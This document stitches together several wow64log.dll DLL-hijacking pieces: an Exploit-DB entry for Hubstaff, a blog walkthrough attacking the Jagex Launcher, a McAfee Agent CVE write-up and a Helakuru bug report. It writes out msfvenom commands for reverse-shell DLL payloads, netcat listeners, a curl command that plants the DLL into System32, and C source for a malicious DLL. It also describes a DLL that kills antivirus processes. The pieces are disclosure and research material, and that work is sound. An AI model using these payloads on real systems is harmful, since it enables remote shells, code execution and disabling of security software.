*#Exploit Title:*  Hubstaff 1.6.14-61e5e22e - 'wow64log' DLL Search Order Hijacking
*#Date:* 14/05/2023
*#Exploit Author:* Ahsan Azad
*#Vendor Homepage:* https://hubstaff.com/
*#Software Link:* https://app.hubstaff.com/download
*#Version:* 1.6.13, 1.6.14
*#Tested On:* 64-bit operating system, x64-based processor

*Description*
Hubstaff is an employee work tracker with screenshots, timesheets, billing,
in-depth reports, and more.

During testing. It was found that the system32 subdirectory was missing a
DLL library with the name *wow64log.dll* that had been required by the
hubstaff's setup file during installation. Hence, using Metasploit's
msfvenom to create a new wow64log.dll file, Tester was able to get a
reverse shell locally.

*Exploit*
1- Generate a dll file with the name  wow64log.dll using the command:

*msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f dll
-o  wow64log.dll*

2- Place the newly generated DLL to the *system32 *directory.
3- Start a listener on attacker's console using:

*nc -lnvp <port_used_while_generating_DLL>*

4- Launch the exe.

Reverse shell will be receive as:

*C:\Windows>*

*Attachments (For the understanding of verification team)*
1.png - Showing the wow64.dll was not found by the exe. [image: 1.png]

2.png - Showing how tester was able to generate a new dll using msfvenom on
port 1337.
[image: 2.png]

3.png - Showing a reverse connection received on the attacker's console
at C:\Windows> by launching the exe.[image: 3.png]

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

A misadventure of learning via games

I have been an avid Runescape player for decades at this point and a couple of years back [Jagex](https://www.jagex.com/en-GB/) started trying to have some ownership of the security over people's accounts by advocating for an all-in-one launching platform called “Jagex Launcher”.

![]()

JagexLauncher

This is a fantastic idea for consumers “gamers” and makes things more manageable for the company for troubleshooting and recovery of accounts due to making the logins utilizing emails, not usernames anymore.

But what about from a security standpoint, does this make things more secure for the end user? We will find out, not so much.

## Download JagexLauncher

First, you must download the JagexLauncher from the Jagex website for Windows.

```
“https://www.jagex[.]com/en-GB/launcher”
```
![]()

Jagex Launcher for Windows

## Download ProcMon

Next, download ProcMon from Microsoft

```
"https://learn.microsoft[.]com/en-us/sysinternals/downloads/procmon"
```
![]()

ProcMon download via Microsoft

## Setup ProcMon

Now, start-up and setup ProcMon

Select the *filters* tab

![]()

Select the “filters” tab

Utilize the filters

```
Process Name is JagexLauncher.exe include
Result is NAME NOT FOUND include
Path ends with .dll include
```
![]()

Specified filters to use

## Observe JagexLauncher behavior with ProcMon

Now let’s check out JagexLauncher.exe while ProcMon is running

We can see that there is a **LOT** of DLLs that do not exist

![]()

multiple DLLs that do not exist

We will be taking a look at “*C:\Windows\System32\wow64log.dll*”

> Keep in mind that since we see “Program Files (x86)” we know that his a 64-bit device.

Spin up your attack box, like Kali, and grab your local host IP, which is “*192.168.153.136*”

```
ifconfig
```
![]()

Local host IP using “ifconfig”

## Create your MSFVENOM payload

Now we have to create our MSFVenom payload, keep in mind you can use other methods but this is fine since we aren’t using a C2 like Sliver, or Cobalt Strike which have their separate internal processes to create these payloads.
**It is important that when we create this DLL we name it “*wow64log.dll*”**

```
sudo msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f dll LHOST=192.168.153.136 LPORT=9500 > wow64log.dll
```
> If using meterpreter or staged payloads, change payload as needed. Also, change LHOST and LPORT as needed.

![]()

creating “wow64log.dll”

## Transfer DLL

Now, let’s get this DLL over to the host machine

**Attacker Box**On our Attacker Box, we will generate a Python HTTP Server to transfer

```
python3 -m http.server
```
> Since no port was specified, port “8000” will be used

![]()

**Victim Box**We will download the DLL to the file location on the Victim box using cURL.

```
curl http://192.168.153.136:8000/wow64log.dll --output C:\Windows\System32\wow64log.dll
```
> Remember, port 8000 is where the file is being hosted and to transfer the file to the “C:\Windows\System32\” file directory

**Confirm Placement**We now want to confirm that the file has been transferred to the location we desired. There are a million ways to do this but I will just check utilizing File Explorer

![]()

confirm the file placement of “wow64log.dll”

**Create a listener on Attack Box**Finally, we MUST set a listener on to catch the shell on execution or this was all for nothing.

```
nc -lvnp 9500
```
> Remember, set the port to 9500 or whatever port you put as LHOST in the MSFVENOM payload

![]()

Setup Listener on port 9500

## TIME FOR THE SUPERBOWL

Let’s launch this application *JagexLauncher.exe* and see if we won the Super Bowl!

BAM! We can see that it worked as planned and you can now do some basic enumeration, such as *whoami*

```
whoami
```
![]()

Successful DLL Hijack of JagexLauncher.exe

# CVE-2020-7315 McAfee Agent DLL injection

12 SEP 2020

CVE

![CVE-2020-7315 McAfee Agent DLL injection feature image](/img/logo_mcafee.jpg)

*DLL injection in McAfee Agent allowing a local administrator to kill the antivirus, or tamper with it, without knowing the McAfee password*

The `macompatsvc.exe` McAfee Agent process tries to load the missing `wow64log.dll` DLL file (in `System32`). By DLL planting a malicious file, a local Windows administrator can achieve code execution in the context of this trusted McAfee process and kill other McAfee processes thus achieving a denial of service on the antivirus which cannot detect and clean viruses anymore.

## McAfee description [🔗](#mcafee-description)

> DLL Injection Vulnerability in McAfee Agent (MA) for Windows prior to 5.6.6 allows local users to execute arbitrary code via careful placement of a malicious DLL.

## Video [🔗](#video)

McAfee Endpoint Security (ENS) version 10.7.0.1285 in trial license is installed. Threat prevent module is in version 10.7.0.1399. McAfee agent is in version 5.6.1.308. AV works properly as shown when the EICAR file is automatically detected and deleted 👌

As admin, we copy the malicious wow64log.dll file into System32 and reboot the system 🥁

After reboot, when we look at McAfee processes we notice something strange: several processes abnormally die and restart. We have the proof that our wow64log.dll was indeed loaded in macompatsvc.exe:

![](/img/macompatsvc_loads_wow64log.png)

We look into the pwn.txt file where the DLL writes its output. We also see that it started killing other McAfee processes. It succeeds for most of them and fails only for a few. Still, we can see that the antivirus is now broken: 💣

* it doesn’t report in the Windows security center
* its interface shows “Error communicating with Event Log”
* the same eicar.txt/eicar.com file is not detected automatically and we cannot even scan it manually

![](/img/03-_mcafee_ko.png)

We can stop this attack by deleting the DLL file. But since it is now loaded we cannot delete it normally. So we use [Sysinternals’ movefile](https://docs.microsoft.com/en-us/sysinternals/downloads/pendmoves) to mark it for deletion at reboot.

We reboot once again. We just get a look at macompatsvc.exe’s file version for reference. And now, since our wow64log.dll was properly deleted, we can see that McAfee starts working properly again by detecting and deleting the eicar.com file that was left 👌

## Trusted process? [🔗](#trusted-process)

As we can expect, McAfee ENS has a self-protection mechanism where even administrators cannot terminate nor inject into McAfee processes. But it seems that all processes of the McAfee family consider other McAfee processes as “trusted” with regards to self-protection. So, if we manage to execute code in the context of one, we could “attack” and kill others!

If I remember correctly, I got the idea from a researcher’s blogpost, where they managed to inject in a benign process of an EDR or antivirus then succeeded in killing the others in the same fashion. Unfortunately I couldn’t find it again and I apologize. Please let me know if that rings a bell on your side!

## 🔍 How did I find this DLL planting? [🔗](#how-did-i-find-this-dll-planting)

To discover that macompatsvc.exe loaded this DLL, I used [Sysinternals’ Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) in boot log mode with the appropriate filters (something like “ends with .dll, and file not found”).

* McAfee program vulnerable to DLL planting:

`C:\Program Files\McAfee\Agent\x86\macompatsvc.exe`

* Malicious DLL location:

`C:\Windows\System32\wow64log.dll`

You can find the code of the DLL I created at the end of this post.

## 🔬 Background on wow64log.dll [🔗](#-background-on-wow64logdll)

This DLL is apparently related to the WoW64 Windows mechanism which allows running 32-bit programs on 64-bit Windows. This subsystem automatically tries to load it even though it does not seem to exist on any public Windows release.

**The key takeway is then that this vulnerability is not restricted to McAfee ENS and other antivirus/EDR might be affected if they have “trusted” 32-bit processes used on 64-bit Windows.**

## Fix and variants [🔗](#fix-and-variants)

Working with McAfee team on this bug was very pleasant, but I decided not to invest more time in verifying the fix and looking for eventual variants (with wow64log.dll, or even other DLLs).

## Implementation for malicious wow64log.dll [🔗](#implementation-for-malicious-wow64logdll)

The malicious DLL works by verifying, when loaded in a process, that it is an interesting McAfee process, otherwise it does nothing. If it is a McAfee process, when the exported Wow64LogInitialize() function will be called, it will start a thread that will list processes and kill all targeted McAfee processes, in loop every 5 minutes.

## **DLL Hijacking Vulnerability in Helakuru**

**Summary**

The Helakuru Desktop version 1.1v operates on both 64-bit and 32-bit architectures. During testing, it was identified that the program attempts to load wow64log.dll, which is not included by default in modern Windows operating systems. This results in a 'Name not found' error, exposing the program to a DLL Hijacking vulnerability. By crafting a malicious wow64log.dll, arbitrary code execution can be achieved.

**Affected Version**

Helakuru Desktop 1.1v

**Steps to Reproduce**

2. Create a Malicious wow64log.dll

```
#include <windows.h>
#include <stdio.h>

void LaunchCalculator()
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    const char* calcCmd = "C:\\Windows\\System32\\calc.exe";

    if (!CreateProcessA(
        NULL,
        (LPSTR)calcCmd,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi))
    {
        printf("CreateProcess failed (%d).\n", GetLastError());
    }
    else
    {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        LaunchCalculator();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

3. Run Helakuru Desktop

* Launch Helakuru Desktop again. The malicious wow64log.dll will now be loaded into the program, triggering the Calculator as a demonstration of successful DLL injection.
